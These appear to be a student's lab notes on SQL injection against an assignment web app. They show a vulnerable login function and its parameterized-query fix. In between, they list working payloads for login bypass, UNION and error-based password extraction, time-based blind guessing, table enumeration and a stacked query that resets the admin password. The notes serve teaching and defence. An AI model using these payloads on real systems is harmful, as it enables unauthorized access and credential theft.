
## Assignment detail
Given a web application, the aim is to exploit 2 vulnerabilities of the website:
- SQL injection (detail [[SQL Injection | Theories]])
- Cross-site script attack

## Assignment 1
Try to login without actually have the credential
>[! First user logged in]
>An always true statement can be problematic, and attackers can inject it into the query command.
>Such as username = `‘ OR ‘1’=’1`


>[!Admin logged in]
>Since in SQL, the `--` indicates comment, so that every thing after double dash will be ignored, a simple attack with username equals to `admin' --` will work

**Why?**
```JavaScript
export function checkUserPass(username: string, password: string): { UID: number, Error?: Error } {
    const hash = md5(password);
    const command =
        "SELECT UID FROM Table_Users WHERE Username='" + username + "' AND Password='" + hash + "'";
    try {
        const uid = db.prepare(command).get() as { UID: number };
        return uid;
    } catch (e) {
        return { UID: 0, Error: e as Error }
    }
}
```

This is the function to authenticate user. and inside variable `command`, it is created by combining strings together: 'SELECT UID FROM Table_Users WHERE Username=', '' AND Password='',... when user put some information, like name and password, the command's value is: 
```SQL
SELECT UID FROM Table_Users WHERE Username='name' AND Password='hash'
```
With the payload `admin' --` the actual value will become:
```SQL
SELECT UID FROM Table_Users WHERE Username='admin' -- AND Password='hash'
```
With the payload `' OR '1'='1`:
```SQL
SELECT UID FROM Table_Users WHERE Username='' OR 1 = 1 -- AND Password='hash'
```

>[! Illegal data extract]
>With the -- equals to comment, we can try unauthorized data extract with the UNION command

```
' UNION SELECT Password FROM Table_Users WHERE Username='admin' --
```
This payload allows to select password from the user table, with the exact name 'admin'. It can be modified base on interest, for example:
```SQL
' UNION SELECT Password FROM Table_Users --
```
Similarly, they can use the same payload to get user, but it is not guarantee that return sequences are the same for 2 payloads, so another solution is `CONCAT` or ´`||` depends on which database engine the website uses.
```SQL
' UNION SELECT CONCAT(Username, ':', Password) FROM Table_Users --
```

>[! Error based query]
>Make the database crash, of course, this is depending on how the application prone to internal error. If not correctly handled, the application will return some sensitive data.

The payload might look like this:
```SQL
' AND (SELECT ExtractValue(1, CONCAT(0x5c, (SELECT Password FROM Table_Users WHERE Username='admin')))) --
```
>[! Sleep time monitor]
>If the application can withstand the internal error, monitor the response time is also a way to exploit it. For example, if attacker injects sleep command, such as `pg_sleep` or `SLEEP`, they can check if the hash password has or does not have a specific character.

```SQL
admin' AND (SELECT IF(SUBSTRING(Password, 1, 1) = 'a', SLEEP(5), 0) FROM Table_Users WHERE Username='admin') --
```
This payload aims to guest the exact password of the admin. If the hash password contains character a, it will SLEEP 5, and by monitoring the response time, they can know whether this character exists or not. This is also called as **blind data extraction** because it guesses character by character.
So the blind attack is also used to find which tables are existing in the database. Because there are 2 main things needed to guesses: the length of table's name and the characters in these tables. And to extract the data, there is a few prerequisites:
- An automation tool (like `sqlmap`) to reduce the manual labor.
- Some knowledge about the database engine: information of tables, schemas and views are stored in `information_schema` (for `MySQL`, `PostgreSQL` and `Microsoft SQL Server`), while `Oracle` uses `all_tables` and `Sqlite` uses `sqlite_master`
```SQL
admin' AND (SELECT LENGTH(name) FROM sqlite_master WHERE type='table' LIMIT 1) = 5 --
admin' AND (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1) = 'u' --
```
>[!Data modification]
>Depending on the specific database driver being used by the backend (for example, if a PHP backend is using `PDO` with multi-statements enabled, or specific Node.js driver configurations). Well this heavily depends on the engine, but attackers do not rest, they try to use as many minions as possible to attack!

In the SQL, the semi colon ; is used to separate statements, that is, two statements can be combined together with a semi colon. For example. this below payload will change password of admin:
```SQL
admin'; UPDATE Table_Users SET Password='new_attacker_hash' WHERE Username='admin'; --
```

>[!How to fix?]
>Parameterized query is the fix. It does not pass the information directly into the statement, the database will compile the execution plan first, it will look for which table, which columns and which conditions are needed to be applied. Then, these values will be pass to blank box. Imagine something like fill in the blank exercise. Even malformed string will actually become clean one.

```TypeScript
export function checkUserPass(username: string, password: string): { UID: number, Error?: Error } {
    const hash = md5(password)
    const command =
        "SELECT UID FROM Table_Users WHERE Username=? AND Password=?";
    try {
        const uid = db.prepare(command).get(username, hash) as { UID: number };
        return uid;
    } catch (e) {
        return { UID: 0, Error: e as Error }
    }
}
```

Refer to actual attack here: [[Attack-SQL-inject]]
